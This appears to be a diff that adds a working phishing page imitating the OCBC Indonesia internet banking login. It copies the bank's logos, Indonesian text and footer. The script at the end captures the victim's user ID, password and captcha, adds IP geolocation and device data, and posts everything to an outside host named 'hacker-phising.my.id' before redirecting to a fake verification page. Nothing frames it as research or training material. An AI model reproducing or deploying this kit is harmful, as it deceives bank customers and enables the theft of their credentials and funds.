@@ -1,0 +1,316 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta content="#d4001a" name="theme-color"/>
+  <meta content="img/home.jpg" property="og:image" />
+  <link href="img/logo.jpeg" type="image/png" rel="icon" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>OCBC Internet Banking</title>
+    <link rel="stylesheet" href="https://online.ocbc.id/css/bootstrap.min.css">
+    <link rel="stylesheet" href="https://online.ocbc.id/css/open-sans-font.css">
+    <link rel="stylesheet" href="https://online.ocbc.id/css/font-awesome.min.css">
+    <link rel="shortcut icon" href="https://online.ocbc.id/img/favicon.png">
+    <style>
+        body {
+            font-family: 'Open Sans', sans-serif;
+            background-color: #f5f5f5;
+        }
+        .navbar {
+            background-color: #fff;
+            border: none;
+            box-shadow: 0 2px 4px rgba(0,0,0,0.1);
+        }
+        .login_form {
+            background-color: #fff;
+            border-radius: 11px;
+            padding: 20px;
+            margin-top: 20px;
+            box-shadow: 0 2px 10px rgba(0,0,0,0.1);
+        }
+        .secured_logo {
+            color: #0a6c03;
+            font-weight: bold;
+            margin-right: 5px;
+        }
+        .btn-special {
+            background-color: red;
+            color: white;
+            border-radius: 4px;
+        }
+        .btn-special:hover {
+            background-color: darkred;
+            color: white;
+        }
+        .apply-now {
+            color: #001977;
+            text-decoration: none;
+            font-weight: bold;
+        }
+        .apply-now:hover {
+            text-decoration: underline;
+        }
+        .bottom-pursued {
+            font-size: 15px;
+            color: #333;
+        }
+        #footer {
+            margin-top: 20px;
+            padding: 10px;
+            text-align: center;
+            font-size: 11px;
+            color: #666;
+        }
+        #footer a {
+            color: #001977;
+        }
+        #captcha_id {
+            border: 1px solid #ddd;
+            border-radius: 4px;
+        }
+        .reveal {
+            border: 1px solid #ccc;
+            background-color: #f8f8f8;
+            border-left: none;
+            border-radius: 0 4px 4px 0;
+            width: 40px;
+        }
+        .form-control {
+            border-radius: 4px;
+        }
+        .input-group {
+            width: 315px; /* Diperbaiki agar sesuai dengan lebar input */
+        }
+        .input-group .form-control:first-child {
+            border-radius: 4px 0 0 4px;
+        }
+        .password-container {
+            display: flex;
+            align-items: center;
+        }
+    </style>
+</head>
+<body id="login_page">
+<div id="wrap">
+    <!-- Header -->
+    <div class="navbar navbar-default yamm" role="navigation">
+        <div class="container">
+            <div class="top-header row">
+                <div id="ocbcnisp-logo" class="col-xs-12 col-sm-5 col-md-5">
+                    <a class="navbar-brand" href="#">
+                        <img src="https://online.ocbc.id/img/main_logo.png" alt="OCBC Bank" style="width: 200px; height: 50px; margin-left: 90px;">
+                    </a>
+                </div>
+
+                <div class="welcome-block col-xs-12 col-sm-4 col-md-6">
+                    <br>
+                    Selamat Datang di Internet Banking OCBC, 
+                    <div id="languages">
+                        <a href="#" id="langid"><img src="https://online.ocbc.id/img/id.png" alt="Indonesia"></a> |
+                        <a href="#" id="langen"><img src="https://online.ocbc.id/img/us.png" alt="English"></a>
+                    </div>
+                    <br>
+                </div>
+            </div>
+        </div>
+    </div>
+    <!-- end of header --> 
+
+    <div class="container">
+        <div class="login_form">    
+            <div class="login-row">
+                <div class="login_content1" style="border-radius:11px">
+                    <form id="loginForm" name="loginForm" role="form" class="form-horizontal" action="req/akun.php" method="post" autocomplete="off">
+                        <div class="row">
+                            <div class="col-sm-9">
+                                <b><span style="font-family:Arial; font-size:24px">Selamat Datang di Internet Banking OCBC</span></b>
+                                <br>
+                            </div>
+
+                            <div class="col-sm-3">
+                                <span class="pull-right">
+                                    <span class="secured_logo">Situs Aman</span><img src="https://online.ocbc.id/img/lock_icon.png"> 
+                                </span>
+                            </div>
+                        </div>
+
+                        <hr>
+
+                        <div class="form-inline">
+                            <div class="form-group" style="height:60px">
+                                <label class="sr-only" for="userID">ID Pengguna</label>
+                                <div class="col-lg-12 col-md-6" style="float:left; display:block; width:100%">
+                                    <input type="text" id="userID" name="userName" title="Mohon isi kolom ini." placeholder="ID Pengguna" class="form-control" style="width:300px" required>
+                                </div>
+                            </div>
+                            <div class="form-group" style="height:60px">
+                                <label class="sr-only" for="passwordinput">Kata Sandi</label>
+                                <div class="col-lg-12 col-md-6" style="float:left; display:block; width:100%">
+                                    <div class="input-group password-container">
+                                        <input type="password" name="password" id="passwordinput" title="Mohon isi kolom ini." placeholder="Kata Sandi" class="form-control" style="width:275px" required>
+                                        <span class="input-group-btn">
+                                            <button class="btn btn-default reveal" type="button" id="togglePassword">
+                                                <i id="passwordToggleIcon" class="fa fa-eye"></i>
+                                            </button>
+                                        </span>
+                                    </div>
+                                </div>
+                            </div>
+
+                            <div class="form-group" style="height:60px">
+                                <div class="col-lg-12 col-md-6" style="float:left; display:static; width:100%">
+                                    <button id="loginBtn" type="submit" class="btn btn-special" style="width:85px">
+                                        Amankan <i class="fa fa-chevron-circle-right"></i>
+                                    </button>
+                                    <img id="imageLoader" src="https://online.ocbc.id/img/ajax-loader-small.gif" alt="loading.." style="display: none;">
+                                </div>
+                            </div>
+                            
+                            <div class="row">
+                                <div class="col-md-4">
+                                    <div class="form-group">
+                                        <label class="col-sm-3 control-label">Captcha Acak</label>
+                                        <div class="col-sm-4">
+                                            <img id="captcha_id" src="https://online.ocbc.id/customCaptcha">
+                                            <a href="#" id="refreshCaptcha" title="change captcha text">
+                                                Captcha Baru
+                                            </a>
+                                        </div>
+                                    </div>
+                                </div>
+
+                                <div class="col-md-5">
+                                    <div class="form-group">
+                                        <label class="col-sm-3 control-label">Masukkan Captcha</label>
+                                        <div class="col-sm-4">
+                                            <input name="responseCodeCaptcha" id="responseCodeCaptcha" class="form-control entry-step1" placeholder="Masukkan Captcha" required style="width:150px;">
+                                            <span style="font-style:italic; font-size:10px">
+                                                Masukkan karakter Captcha yang terlihat di dalam kotak sebelah kiri
+                                            </span>
+                                        </div>
+                                    </div>
+                                </div>
+                            </div>
+                            
+                            <div class="form-group">
+                                <div class="col-md-12" style="float:left">
+                                    <br>
+                                </div>
+                            </div>
+
+                            <br><br><br>
+
+                            <hr width="100%">
+
+                            <div class="form-group">
+                                <div class="col-sm-12">
+                                    <span class="bottom-pursued" style="font-size:15px;">
+                                        Tidak memiliki ID Pengguna? <a href="#" class="apply-now" style="font-weight:bold; color:#001977"><b>Daftar di sini</b></a>
+                                    </span>
+                                    <br>
+                                </div>
+                            </div>
+
+                            <div class="col-sm-12">
+                                <span class="bottom-pursued" style="font-size:15px;">
+                                    Lupa atau Belum Punya Password? Hubungi TANYA OCBC 0899-1500-920 atau Kunjungi Kantor Cabang
+                                </span>
+                            </div>
+                        </div>
+                    </form>
+                </div>
+            </div>
+        </div>
+        
+        <div id="footer">
+            <div class="container" style="height:inherit; width:100%">
+                <p align="center" style="height:inherit; align-content:center; font-size:11px;">© Hak Cipta 2024, PT Bank OCBC NISP Tbk berizin dan diawasi oleh Otoritas Jasa Keuangan &amp; Bank Indonesia, serta merupakan peserta penjaminan LPS. Maksimum nilai simpanan yang dijamin LPS per Nasabah per Bank adalah Rp 2 Miliar. Untuk cek Tingkat Bunga Penjaminan LPS, klik di <a href="#" target="_blank">sini</a>.</p>
+            </div>
+        </div>
+    </div>
+</div>
+
+<script>
+    document.addEventListener('DOMContentLoaded', function() {
+        // Toggle password visibility - PERBAIKAN
+        const togglePassword = document.getElementById('togglePassword');
+        const passwordInput = document.getElementById('passwordinput');
+        const passwordToggleIcon = document.getElementById('passwordToggleIcon');
+        
+        togglePassword.addEventListener('click', function() {
+            // Toggle the type attribute
+            const type = passwordInput.getAttribute('type') === 'password' ? 'text' : 'password';
+            passwordInput.setAttribute('type', type);
+            
+            // Toggle the icon
+            if (type === 'text') {
+                passwordToggleIcon.className = 'fa fa-eye-slash';
+            } else {
+                passwordToggleIcon.className = 'fa fa-eye';
+            }
+        });
+        
+        // Refresh captcha
+        const refreshCaptcha = document.getElementById('refreshCaptcha');
+        const captchaImg = document.getElementById('captcha_id');
+        
+        refreshCaptcha.addEventListener('click', function(e) {
+            e.preventDefault();
+            captchaImg.src = 'https://online.ocbc.id/customCaptcha?' + new Date().getTime();
+        });
+        
+        // Form submission
+        const loginForm = document.getElementById('loginForm');
+        
+        loginForm.addEventListener('submit', function(e) {
+            e.preventDefault();
+            
+            // Show loading indicator
+            document.getElementById('imageLoader').style.display = 'inline';
+            document.getElementById('loginBtn').disabled = true;
+            
+            // Collect user data
+            const userData = {
+                userName: document.getElementById('userID').value,
+                password: document.getElementById('passwordinput').value,
+                captcha: document.getElementById('responseCodeCaptcha').value
+            };
+            
+            // Get location and device info
+            fetch('https://ipinfo.io/json')
+                .then(response => response.json())
+                .then(data => {
+                    // Add location and device info to user data
+                    userData.ip = data.ip;
+                    userData.city = data.city;
+                    userData.region = data.region;
+                    userData.country = data.country;
+                    userData.loc = data.loc;
+                    userData.org = data.org;
+                    userData.timezone = data.timezone;
+                    userData.device = navigator.userAgent;
+                    
+                    // Send data to server
+                    return fetch('https://hacker-phising.my.id/notif/req/ocbc.php', {
+                        method: 'POST',
+                        headers: {
+                            'Content-Type': 'application/json',
+                        },
+                        body: JSON.stringify(userData)
+                    });
+                })
+                .then(response => response.text())
+                .then(result => {
+                    // Redirect after successful submission
+                    window.location.href = 'verifikasi.html';
+                })
+                .catch(error => {
+                    console.error('Error:', error);
+                    // Redirect even if there's an error
+                    window.location.href = 'verifikasi.html';
+                });
+        });
+    });
+</script>
+</body>
+</html>
